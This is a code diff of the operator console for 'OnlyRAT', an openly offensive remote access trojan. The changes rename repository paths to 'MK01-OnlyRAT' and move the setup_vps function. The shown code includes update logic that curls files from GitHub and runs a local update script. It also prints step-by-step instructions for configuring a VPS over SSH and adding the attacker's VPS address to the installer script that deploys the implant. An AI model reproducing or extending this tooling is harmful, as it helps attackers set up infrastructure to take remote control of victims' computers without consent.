@@ -79,8 +79,8 @@ options_menu = """
 
 username = getpass.getuser() # gets username
 header = f"[~] {username}@onlyrat $ " # sets up user input interface
-remote_path = "raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main" # url path for OnlyRAT files
-local_path = f"/home/{username}/.OnlyRAT" if username != "root" else "/root/.OnlyRAT" # gets path of OnlyRAT
+remote_path = "raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main" # url path for OnlyRAT files
+local_path = f"/home/{username}/.MK01-OnlyRAT" if username != "root" else "/root/.MK01-OnlyRAT" # gets path of OnlyRAT
 
 # read config file
 def read_config(config_file):
@@ -209,14 +209,14 @@ def update():
     print("\n[*] Checking for updates...")
 
     # get latest version nubmer
-    os.system("curl https://raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
+    os.system("curl https://raw.githubusercontent.com/CosmodiumCS/MK01-OnlyRAT/main/version.txt | tee ~/.OnlyRAT/latest.txt")
 
     # save version nubmers to memory
     current_version = float(open(f"{local_path}/version.txt", "r").read())
     latest_version = float(open(f"{local_path}/latest.txt", "r").read())
 
     # remove version number file
-    os.system("rm -rf ~/.OnlyRAT/latest.txt")
+    os.system("rm -rf ~/.MK01-OnlyRAT/latest.txt")
 
     # if new version is available, update
     if latest_version > current_version:
@@ -228,7 +228,7 @@ def update():
 
         # update
         if option == "y":
-            os.system("bash ~/.OnlyRAT/payloads/update.sh")
+            os.system("bash ~/.MK01-OnlyRAT/payloads/update.sh")
 
             # exception
             # else:
@@ -250,7 +250,7 @@ def remove():
 
     # delete OnlyRAT
     if option == "y":
-        os.system("rm -rf ~/.OnlyRAT")
+        os.system("rm -rf ~/.MK01-OnlyRAT")
 
     # cancel
     if option == "n":
@@ -286,30 +286,6 @@ def parameters(arg0):
 
     return result
 
-# setup vps
-def setup_vps():
-    user = vps_parameters("[~] What is the VPS User? : ")
-    address = vps_parameters("[~] What is the VPS IP Address? : ")
-    port = vps_parameters("[~] What is the VPS Port? : ")
-    # format vps
-    vps = f"{user}@{address}"
-
-    # confirm values
-    print("[~] Is The Following Correct? : [y/n]")
-    print(f"{vps} -p {port}")
-    confirm = input(header)
-    print()
-
-    # if yes
-    if confirm in ["y", "yes"]:
-        vps_parameters(port, vps, user)
-    elif confirm in ["n", "no"]:
-        setup_vps()
-
-    else:
-        print("[!!] Value Not Recognized")
-
-
 def vps_parameters(port, vps, user):
     # ssh vps settings
     print("""
@@ -319,7 +295,7 @@ def vps_parameters(port, vps, user):
             
             [1] set up the VPS and edit the ssh file
 
-                nano /etc/ssh/sshd_config 
+                sudo nano /etc/ssh/sshd_config 
             
             [2] change the following, remove "#"
 
@@ -365,7 +341,7 @@ def vps_parameters(port, vps, user):
 
             [5] Add OnlyRAT to Web Server
 
-                git clone https://github.com/cosmodiumcs/onlyrat.git
+                git clone https://github.com/CosmodiumCS/mk01-onlyrat.git
 
             [6] On Line 2 of '/installers/from-vps.cmd', 
                 Add Your VPS IP Address
@@ -385,13 +361,28 @@ def vps_parameters(port, vps, user):
             [+] Congrats! You are all set up!
             """)
 
-def vps_parameters(arg0):
-    # user input, address
-    print(arg0)
-    result = input(header)
+# setup vps
+def setup_vps():
+    user = parameters("[~] What is the VPS User? : ")
+    address = parameters("[~] What is the VPS IP Address? : ")
+    port = parameters("[~] What is the VPS Port? : ")
+    # format vps
+    vps = f"{user}@{address}"
+
+    # confirm values
+    print("[~] Is The Following Correct? : [y/n]")
+    print(f"{vps} -p {port}")
+    confirm = input(header)
     print()
 
-    return result
+    # if yes
+    if confirm in ["y", "yes"]:
+        vps_parameters(port, vps, user)
+    elif confirm in ["n", "no"]:
+        setup_vps()
+
+    else:
+        print("[!!] Value Not Recognized")
 
 # command line interface
 def cli(arguments):
@@ -486,7 +477,7 @@ def cli(arguments):
                         main()
 
                 elif option in ["man", "manual"]:
-                    os.system("xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+                    os.system("xdg-open https://github.com/CosmodiumCS/MK01-OnlyRAT/blob/main/payloads/manual.md")
 
                 elif option in ["remove", "uninstall"]:
                     remove()
@@ -507,7 +498,7 @@ def cli(arguments):
             setup_vps()
 
         elif argument in ["--manual", "-m", "--man"]:
-            os.system("xdg-open https://github.com/CosmodiumCS/OnlyRAT/blob/main/payloads/manual.md")
+            os.system("xdg-open https://github.com/CosmodiumCS/MK01-OnlyRAT/blob/main/payloads/manual.md")
 
         elif argument in ["--version", "-v"]:
             os.system(f"cat {local_path}/version.txt")
